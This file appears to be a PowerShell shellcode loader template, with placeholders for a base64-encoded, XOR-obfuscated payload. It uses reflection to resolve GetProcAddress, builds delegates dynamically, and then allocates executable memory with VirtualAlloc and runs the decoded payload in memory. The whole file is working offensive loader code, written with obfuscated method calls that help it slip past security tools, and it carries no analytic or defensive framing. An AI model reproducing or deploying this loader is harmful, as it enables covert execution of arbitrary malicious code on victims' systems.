$application_domain = ([type]('appdomain'));$intpointer = ([type]('intptr'));$converter = ([type]('convert'));$unsignedint32 = ([type]('UInt32'));$voidtype = ([type]('void'));
function func_get_proc_address{
    Param($module_name, $procedure_name);
    $unsafe_native_methods = ($application_domain::'CurrentDomain'.('GetAssemblies').invoke() | Where-Object {$_.'GlobalAssemblyCache' -And $_.'Location'.('Split').Invoke('\\')[-1].('Equals').Invoke('System.dll')}).('GetType').Invoke('Microsoft.Win32.UnsafeNativeMethods');
    $get_procedure_address = $unsafe_native_methods.('GetMethod').Invoke('GetProcAddress', [Type[]]@('Runtime.InteropServices.HandleRef', 'string'));
    return $get_procedure_address.Invoke($null, @([Runtime.InteropServices.HandleRef](New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr), ($unsafe_native_methods.('GetMethod').Invoke('GetModuleHandle')).Invoke($null, @($module_name)))), $procedure_name));
};
function func_get_delegate_type{
    Param([Parameter(Position = 0, Mandatory = $True)][Type[]]$parameters, [Parameter(Position = 1)][Type]$return_type = $voidtype);
    $type_builder = $application_domain::'CurrentDomain'.('DefineDynamicAssembly').Invoke((New-Object Reflection.AssemblyName('ReflectedDelegate')), ([type]('Reflection.Emit.AssemblyBuilderAccess'))::'Run').('DefineDynamicModule').Invoke('InMemoryModule', $false).('DefineType').Invoke('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', ([type]('MulticastDelegate')));
    $type_builder.('DefineConstructor').Invoke('RTSpecialName, HideBySig, Public', ([type]('Reflection.CallingConventions'))::'Standard', $parameters).('SetImplementationFlags').Invoke('Runtime, Managed');
    $type_builder.('DefineMethod').Invoke('Invoke', 'Public, HideBySig, NewSlot, Virtual', $return_type, $parameters).('SetImplementationFlags').Invoke('Runtime, Managed');
    return $type_builder.('CreateType').Invoke();
};
[Byte[]]$payload_code = $converter::('FromBase64String').Invoke('{{B64_PAYLOAD}}');
for ($counter_variable = 0; $counter_variable -lt $payload_code.('Count'); $counter_variable++) {
    $payload_code[$counter_variable] = $payload_code[$counter_variable] -bxor {{XOR_KEY}};
};
$virtalloc = [Runtime.InteropServices.Marshal]::('GetDelegateForFunctionPointer').Invoke((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @($intpointer, $unsignedint32, $unsignedint32, $unsignedint32) ($intpointer)));
$memory_buffer = $virtalloc.Invoke($intpointer::'Zero', $payload_code.('Length'), 0x3000, 0x40);
[Runtime.InteropServices.Marshal]::('Copy').Invoke($payload_code, 0, $memory_buffer, $payload_code.('length'));
$payload_function = [Runtime.InteropServices.Marshal]::('GetDelegateForFunctionPointer').Invoke($memory_buffer, (func_get_delegate_type @($intpointer) ($voidtype)));
$payload_function.Invoke($intpointer::'Zero');
